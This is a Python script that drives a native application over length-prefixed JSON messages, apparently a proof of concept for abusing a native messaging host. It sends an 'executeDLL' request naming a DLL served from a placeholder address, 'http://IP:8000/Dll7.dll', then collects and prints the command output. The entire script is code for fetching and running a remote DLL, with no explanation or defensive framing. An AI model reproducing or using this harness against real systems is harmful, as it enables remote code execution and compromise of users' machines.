import struct
import subprocess
import json
import time

def send_message(process, message_dict):
    """
    Sends a JSON message to the native app process with a 4-byte length prefix.
    """
    message = json.dumps(message_dict)
    message_length = len(message)
    binary_message = struct.pack('<I', message_length) + message.encode('utf-8')
    
    process.stdin.write(binary_message)
    process.stdin.flush()

def read_message(process):
    """
    Reads a JSON message from the native app process. The message is prefixed with a 4-byte length.
    """
    try:
        # Read the 4-byte length
        length_bytes = process.stdout.read(4)
        if not length_bytes:
            return None

        length = struct.unpack('<I', length_bytes)[0]

        # Read the message content
        message = process.stdout.read(length).decode('utf-8')
        return json.loads(message)
    except (struct.error, json.JSONDecodeError) as e:
        print(f"Failed to read or decode message: {e}")
        return None

def main():
    """
    Main function to test the native app with the command execution DLL.
    """
    # Start the native app process
    process = subprocess.Popen(
        ["NAMEOFTHEAPP.exe"],  # Update with your executable name
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        bufsize=0  # Unbuffered
    )

    try:
        # Send the DLL execution message
        dll_url = "http://IP:8000/Dll7.dll"  # Update with your DLL URL
        print(f"Sending DLL execution request with URL: {dll_url}")
        send_message(process, {
            "action": "executeDLL",
            "url": dll_url
        })

        # Process responses from the native app
        while True:
            response = read_message(process)
            if not response:
                print("No response received. Terminating.")
                break

            print(f"\nReceived response: {json.dumps(response, indent=2)}")

            status = response.get("status")
            
            if status == "progress":
                print(f"Progress: {response.get('message', 'Working...')}")
            elif status == "success":
                if "output" in response:
                    print("\nCommand Output:")
                    print(response["output"])
                print("Execution completed successfully.")
                break  # Exit after success
            elif status == "error":
                print(f"\nError occurred: {response.get('message', 'Unknown error')}")
                break  # Exit after error
            
            time.sleep(0.1)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Cleanup process
        process.terminate()
        try:
            process.wait(timeout=1)  # Reduced timeout
        except subprocess.TimeoutExpired:
            process.kill()

if __name__ == "__main__":
    main()
    
 
